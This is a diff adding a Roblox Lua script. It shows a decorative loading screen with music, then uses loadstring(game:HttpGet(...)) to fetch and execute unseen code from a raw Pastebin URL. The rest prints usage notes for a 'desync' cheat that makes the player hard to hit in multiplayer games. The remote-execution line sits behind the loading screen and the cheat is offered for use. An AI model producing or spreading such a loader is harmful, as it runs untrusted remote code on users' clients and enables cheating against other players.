@@ -1,0 +1,307 @@
+-- Made By Claude
+
+-- Edited & Optimized By CHAT GPT
+
+-- Ideas By AintMyCrib Full of Shit
+
+local p=game:GetService("Players").LocalPlayer
+
+local ts=game:GetService("TweenService")
+
+local sg=Instance.new("ScreenGui",p:WaitForChild("PlayerGui"))
+
+sg.Name="LoadingScreen"
+
+sg.IgnoreGuiInset=true
+
+sg.ResetOnSpawn=false
+
+sg.DisplayOrder=999
+
+-- Background
+
+local bg=Instance.new("Frame",sg)
+
+bg.Size=UDim2.new(1,0,1,0)
+
+bg.BackgroundColor3=Color3.fromRGB(10,10,25)
+
+bg.BorderSizePixel=0
+
+Instance.new("UIGradient",bg).Color=ColorSequence.new{
+
+ColorSequenceKeypoint.new(0,Color3.fromRGB(15,10,45)),
+
+ColorSequenceKeypoint.new(1,Color3.fromRGB(5,5,15))
+
+}
+
+-- Title
+
+local title=Instance.new("TextLabel",bg)
+
+title.Size=UDim2.new(0.85,0,0.1,0)
+
+title.Position=UDim2.new(0.075,0,0.22,0)
+
+title.BackgroundTransparency=1
+
+title.Text="😄 Loading Experience 😄"
+
+title.TextColor3=Color3.new(1,1,1)
+
+title.TextScaled=true
+
+title.Font=Enum.Font.GothamBold
+
+-- Subtitle
+
+local sub=Instance.new("TextLabel",bg)
+
+sub.Size=UDim2.new(0.75,0,0.06,0)
+
+sub.Position=UDim2.new(0.125,0,0.34,0)
+
+sub.BackgroundTransparency=1
+
+sub.Text="Please wait while setup runs..."
+
+sub.TextColor3=Color3.fromRGB(180,180,220)
+
+sub.TextScaled=true
+
+sub.Font=Enum.Font.Gotham
+
+-- Bar BG
+
+local barBg=Instance.new("Frame",bg)
+
+barBg.Size=UDim2.new(0.75,0,0.035,0)
+
+barBg.Position=UDim2.new(0.125,0,0.55,0)
+
+barBg.BackgroundColor3=Color3.fromRGB(30,30,60)
+
+barBg.BorderSizePixel=0
+
+Instance.new("UICorner",barBg)
+
+-- Bar Fill
+
+local bar=Instance.new("Frame",barBg)
+
+bar.Size=UDim2.new(0,0,1,0)
+
+bar.BackgroundColor3=Color3.fromRGB(120,120,255)
+
+bar.BorderSizePixel=0
+
+Instance.new("UICorner",bar)
+
+-- Percent
+
+local txt=Instance.new("TextLabel",bg)
+
+txt.Size=UDim2.new(0.3,0,0.07,0)
+
+txt.Position=UDim2.new(0.35,0,0.62,0)
+
+txt.BackgroundTransparency=1
+
+txt.Text="0%"
+
+txt.TextColor3=Color3.fromRGB(200,200,255)
+
+txt.TextScaled=true
+
+txt.Font=Enum.Font.GothamBold
+
+-- Music
+
+local s=Instance.new("Sound",sg)
+
+s.SoundId="rbxassetid://110919391228823"
+
+s.Volume=1
+
+s.Looped=true
+
+s:Play()
+
+-- Speed intro then normalize
+
+s.PlaybackSpeed=14
+
+task.delay(2,function()
+
+ts:Create(s,TweenInfo.new(0.5),{PlaybackSpeed=1}):Play()
+
+end)
+
+-- Loading
+
+for i=1,100 do
+
+ts:Create(bar,TweenInfo.new(0.08),{Size=UDim2.new(i/100,0,1,0)}):Play()
+
+txt.Text=i.."%"
+
+task.wait(0.08)
+
+end
+
+txt.Text="Ready! ✓"
+
+task.wait(0.5)
+
+-- Fade out
+
+for _,v in ipairs(sg:GetDescendants()) do
+
+if v:IsA("TextLabel") then
+
+ts:Create(v,TweenInfo.new(1),{TextTransparency=1}):Play()
+
+elseif v:IsA("Frame") then
+
+ts:Create(v,TweenInfo.new(1),{BackgroundTransparency=1}):Play()
+
+end
+
+end
+
+task.wait(1)
+
+s:Stop()
+
+sg:Destroy()
+
+print("✅ Loading complete!")
+
+-- 🔥 Chat system (optimized)
+
+local function send(m)
+
+local tcs=game:GetService("TextChatService")
+
+if tcs.ChatVersion==Enum.ChatVersion.TextChatService then
+
+pcall(function()tcs.TextChannels.RBXGeneral:SendAsync(m)end)
+
+else
+
+pcall(function()game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m,"All")end)
+
+end
+
+end
+
+local name=p.Name
+
+if _G.DesyncInfoPrinted then return end
+
+_G.DesyncInfoPrinted = true
+
+print("=== DESYNC SYSTEM INFO ===")
+
+task.wait(1)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/C356EeyK"))()
+
+-- UI
+
+print("[UI]")
+
+print("The UI controls desync modes.")
+
+print("Sync = Normal desync.")
+
+print("Burst = Instant desync.")
+
+print("You can toggle modes anytime.")
+
+task.wait(0.3)
+
+-- Normal (your logic)
+
+print("[NORMAL DESYNC]")
+
+print("Does NOT reset your character.")
+
+print("Can be turned on anywhere at any time.")
+
+print("Runs a loop that forces desync continuously.")
+
+print("Has a 12 second sync delay before fully active.")
+
+print("You can turn it off anytime during the countdown.")
+
+print("Safer but slower effect compared to instant.")
+
+task.wait(0.3)
+
+-- Instant
+
+print("[INSTANT DESYNC]")
+
+print("Resets your character to lock position.")
+
+print("Applies desync instantly with no delay.")
+
+print("Stronger and faster than normal.")
+
+print("May be risky due to reset.")
+
+task.wait(0.3)
+
+-- Distance
+
+print("[DISTANCE / STUDS]")
+
+print("Players can still hit you if you are close enough.")
+
+print("Hit range depends on game/tool reach (studs).")
+
+print("Closer = higher chance to get hit.")
+
+task.wait(0.3)
+
+-- Why hits still happen
+
+print("[WHY YOU STILL GET HIT]")
+
+print("Not a full resync.")
+
+print("Server uses last known position to calculate hits.")
+
+print("If enemy is near that position, damage can register.")
+
+print("Some games also allow client-side hit detection.")
+
+task.wait(0.3)
+
+-- Game difference
+
+print("[GAME DEPENDENCY]")
+
+print("Some games allow client hits → easier to get hit.")
+
+print("Some rely on server → desync works better.")
+
+print("Effectiveness depends on the game.")
+
+task.wait(0.3)
+
+-- Tips
+
+print("[TIPS]")
+
+print("Use Normal for safer long usage.")
+
+print("Use Instant for quick strong desync.")
+
+print("Keep distance to avoid damage.")
+
+print("Turn off/on depending on situation.")
+
+print("=== END ===")
